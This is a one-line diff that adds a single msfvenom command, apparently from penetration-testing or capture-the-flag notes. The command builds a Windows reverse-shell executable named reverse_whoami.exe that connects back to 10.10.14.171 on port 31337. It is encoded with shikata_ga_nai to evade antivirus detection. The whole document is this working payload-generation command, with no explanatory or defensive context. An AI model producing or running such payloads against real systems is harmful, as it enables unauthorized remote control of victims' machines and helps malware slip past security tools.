@@ -1,0 +1,1 @@
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.14.171 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o reverse_whoami.exe
